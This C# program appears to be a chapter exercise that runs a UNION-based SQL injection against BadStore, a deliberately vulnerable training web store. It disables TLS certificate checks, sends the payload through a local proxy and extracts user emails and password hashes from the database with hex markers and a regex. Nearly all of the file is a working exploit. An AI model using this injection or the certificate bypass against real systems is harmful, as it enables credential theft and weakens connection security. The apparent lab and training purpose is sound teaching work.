using System;
using System.Linq;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;

namespace ch2_sqli_union
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			System.Net.ServicePointManager.ServerCertificateValidationCallback +=
				delegate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate,
					System.Security.Cryptography.X509Certificates.X509Chain chain,
					System.Net.Security.SslPolicyErrors sslPolicyErrors)
			{
				return true; //Verify any cert regardless of errors
			};

			string frontMarker = "FrOnTMaRker";
			string middleMarker = "mIdDlEMaRker";
			string endMarker = "eNdMaRker";
			string frontHex = string.Join ("", frontMarker.ToCharArray ().Select (c => ((int)c).ToString ("X2")));
			string middleHex = string.Join ("", middleMarker.ToCharArray ().Select (c => ((int)c).ToString ("X2")));
			string endHex = string.Join ("", endMarker.ToCharArray ().Select (c => ((int)c).ToString ("X2")));

			string url = "https://192.168.1.78/cgi-bin/badstore.cgi";
			string payload = "fdsa' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x"+frontHex+",IFNULL(CAST(email AS CHAR),0x20),0x"+middleHex+",IFNULL(CAST(passwd AS CHAR),0x20),0x"+endHex+") FROM badstoredb.userdb-- ";
			url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";

			HttpWebRequest request = (HttpWebRequest)WebRequest.Create (url);
			request.Proxy = new WebProxy ("127.0.0.1", 8080);

			string response = string.Empty;
			using (StreamReader reader = new StreamReader (request.GetResponse ().GetResponseStream ()))
				response = reader.ReadToEnd ();

			Regex payloadRegex = new Regex (frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
			MatchCollection matches = payloadRegex.Matches (response);

			foreach (Match match in matches) {
				Console.WriteLine ("Username: " + match.Groups [1].Value + "\t Password hash: " + match.Groups[2].Value);
			}
		}
	}
}
